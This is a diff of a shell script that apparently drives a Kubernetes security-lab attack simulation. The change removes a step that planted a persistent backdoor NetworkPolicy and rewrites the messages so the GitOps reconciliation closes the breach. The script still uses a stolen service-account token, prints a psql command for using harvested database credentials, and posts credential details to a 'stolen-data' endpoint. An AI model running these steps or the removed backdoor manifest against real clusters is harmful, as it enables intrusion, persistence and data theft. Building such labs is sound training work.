@@ -89,41 +89,7 @@ emit "IMPACT" "CRITICAL" \
   "postgres:5432 → $POSTGRES_RESULT" \
   "TCP probe result after deny-all deletion. Network path confirmed $POSTGRES_RESULT."
 
-# ── Step 6: Create attacker backdoor NetworkPolicy ───────────────────────────
-emit "ATTACK" "CRITICAL" \
-  "Creating attacker NetworkPolicy: attacker-postgres-exfil" \
-  "network-tooling-sa can CREATE as well as delete. Attacker plants a targeted egress rule to postgres that will persist even after ArgoCD restores deny-all."
-
-kubectl apply \
-  --token="$TOKEN" \
-  --server="$APISERVER" \
-  --certificate-authority="$CA" \
-  -f - <<'EOF' 2>/dev/null || true
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: attacker-postgres-exfil
-  namespace: secops-lab
-spec:
-  podSelector:
-    matchLabels:
-      app: target-app
-  policyTypes:
-    - Egress
-  egress:
-    - to:
-        - podSelector:
-            matchLabels:
-              app: postgres
-      ports:
-        - port: 5432
-EOF
-
-emit "ATTACK" "CRITICAL" \
-  "Backdoor planted — postgres access survives ArgoCD reconciliation" \
-  "attacker-postgres-exfil NetworkPolicy created. ArgoCD will restore deny-all but this attacker-created policy is not in Git — ArgoCD will not delete it. Database remains reachable after the window closes."
-
-# ── Step 7: Try to suspend ArgoCD (will fail) ─────────────────────────────────
+# ── Step 6: Try to suspend ArgoCD (will fail) ─────────────────────────────────
 kubectl patch application secops-lab \
   --token="$TOKEN" \
   --server="$APISERVER" \
@@ -133,31 +99,31 @@ kubectl patch application secops-lab \
   -p '{"spec":{"syncPolicy":{"automated":null}}}' \
   2>&1 || emit "DETECT" "WARNING" \
     "ArgoCD suspend failed — SA has no rights to argocd namespace" \
-    "network-tooling-sa is scoped to secops-lab only. ArgoCD cannot be touched. deny-all will reconcile back in ~30 seconds — but the attacker backdoor will remain."
+    "network-tooling-sa is scoped to secops-lab only. ArgoCD cannot be touched, so GitOps stays in control. deny-all will reconcile back in ~30 seconds — closing the attacker's path. The breach does not persist."
 
-# ── Step 8: Record window start ───────────────────────────────────────────────
+# ── Step 7: Record window start ───────────────────────────────────────────────
 WINDOW_START=$(date +%s)
 curl -sf -X POST "$BACKEND_URL/internal/window-start" \
   -H "Content-Type: application/json" \
   -d "{\"scenario\":\"network-policy-bypass\",\"started_at\":$WINDOW_START}" \
   || true
 
-# ── Step 9: Emit final IMPACT ─────────────────────────────────────────────────
+# ── Step 8: Emit final IMPACT ─────────────────────────────────────────────────
 emit "IMPACT" "CRITICAL" \
   "postgres=$POSTGRES_RESULT — with credentials stolen pre-attack, attacker can now run: psql -h ${DB_HOST:-postgres} -U ${DB_USER:-app} -d ${DB_NAME:-appdb}" \
-  "Credentials were harvested before the network was opened (Phase 1). Now that deny-all is gone and attacker-postgres-exfil is planted, those credentials have a live path. Even after ArgoCD restores deny-all, the backdoor policy keeps the route open."
+  "Credentials were harvested before the network was opened (Phase 1). With deny-all deleted, those credentials now have a live path to the database. The attacker cannot suspend ArgoCD (SA is namespace-scoped), so GitOps restores deny-all within ~30s — closing this path. The breach is bounded by reconciliation time, with no persistence."
 
-# ── Step 10: Send stolen data to backend ──────────────────────────────────────
+# ── Step 9: Send stolen data to backend ───────────────────────────────────────
 STOLEN=$(jq -n \
   --arg creds "host=${DB_HOST:-postgres} user=${DB_USER:-app} database=${DB_NAME:-appdb} password=${DB_PASSWORD:0:2}***" \
   --arg np_map "$NP_LIST ($NP_COUNT policies)" \
   --arg postgres "postgres:5432 → $POSTGRES_RESULT" \
-  --arg backdoor "attacker-postgres-exfil created — persists after ArgoCD restore" \
-  '{credentials: $creds, network_map: $np_map, postgres_probe: $postgres, backdoor_np: $backdoor}')
+  --arg window "deny-all deleted — path open only until ArgoCD reconciles (~30s), no backdoor planted" \
+  '{credentials: $creds, network_map: $np_map, postgres_probe: $postgres, exposure_window: $window}')
 
 curl -sf -X POST "$BACKEND_URL/internal/stolen-data" \
   -H "Content-Type: application/json" \
   -d "{\"scenario\":\"network-policy-bypass\",\"data\":$(echo "$STOLEN" | jq -Rs .)}" \
   || true
 
-echo "Attack complete — window open, ArgoCD reconciles deny-all in ~30s but backdoor persists"
+echo "Attack complete — window open, ArgoCD reconciles deny-all in ~30s and the path closes (no backdoor)"
